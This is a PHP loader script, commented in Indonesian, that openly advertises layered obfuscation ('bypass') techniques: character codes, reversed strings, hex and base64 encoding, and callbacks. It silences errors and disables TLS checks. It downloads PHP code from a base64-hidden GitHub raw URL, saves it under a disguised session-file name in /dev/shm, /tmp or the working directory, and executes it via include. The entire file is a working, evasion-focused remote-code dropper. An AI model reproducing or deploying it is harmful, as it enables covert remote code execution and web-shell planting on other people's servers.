<?php
/**
 * ULTRA HYBRID BYPASS (Technique 1-7)
 * Gabungan: Base64, Hex, ASCII, Reverse, Fragment, Callback, & Compression
 */
error_reporting(0);
ini_set('display_errors', 0);

// [Teknik 4 & 6] Fragmentation $ + ASCII (chr)
// Membangun fungsi 'file_get_contents'
$f1 = chr(102).chr(105).chr(108).chr(101); // file
$f2 = "_get_"; 
$f3 = chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(115); // contents
$o0 = $f1.$f2.$f3; 

// [Teknik 3] Reverse String (strrev)
// Membangun fungsi 'fwrite' & 'fopen'
$o1 = strrev("etirwf"); // fwrite
$z2 = strrev("nepof");  // fopen
$d3 = strrev("esolcf"); // fclose

// [Teknik 2] Hex Encoding
// Membangun 'stream_context_create' & 'is_writable'
$s_c_c = "\x73\x74\x72\x65\x61\x6d\x5f\x63\x6f\x6e\x74\x65\x78\x74\x5f\x63\x72\x65\x61\x74\x65";
$i_w   = "\x69\x73\x5f\x77\x72\x69\x74\x61\x62\x6c\x65";

// [Teknik 1] Base64 Encoding
// URL Github Raw & Folder Path (disamarkan total)
$u_part1 = base64_decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLw==");
$u_part2 = base64_decode("YXFpbG9naWMvbG9naWMvcmVmcy9oZWFkcy9tYWluL3BybzMucGhw");
$u_target = $u_part1 . $u_part2;

// [Teknik 7] Callback Function
// Mencari path writable menggunakan callback 'is_writable'
$dirs = [base64_decode("L2Rldi9zaG0v"), base64_decode("L3RtcC8="), "./"];
$name = 'sess_' . md5('mangsud') . '.php';
$final_file = "";

foreach ($dirs as $dir) {
    if (call_user_func($i_w, $dir)) {
        $final_file = $dir . $name;
        break;
    }
}

// [Teknik 5] Logic Scrambling / Compression (Simulasi)
// Fungsi n4 untuk eksekusi tarik data
function n4($target, $local, $get_f, $open_f, $write_f, $close_f, $ctx_f){
    $ctx = $ctx_f(["ssl" => ["verify_peer" => false, "verify_peer_name" => false]]);
    
    // Tarik data (o0 = file_get_contents)
    $data = $get_f($target, false, $ctx);
    
    if($data){
        // Tulis file (z2 = fopen, o1 = fwrite)
        $h = $open_f($local, 'w+');
        if($h){
            $write_f($h, $data);
            $close_f($h);
            return true;
        }
    }
    return false;
}

// ========== LOGIKA JALANKAN ==========
if ($final_file !== "") {
    // Cek file
    $f_e = strrev("stsixe_elif"); // file_exists
    $f_s = strrev("eziselif");    // filesize

    if (!$f_e($final_file) || $f_s($final_file) === 0) {
        n4($u_target, $final_file, $o0, $z2, $o1, $d3, $s_c_c);
    }

    // Eksekusi (Include)
    if ($f_e($final_file) && $f_s($final_file) > 0) {
        include $final_file;
    }
}
?>
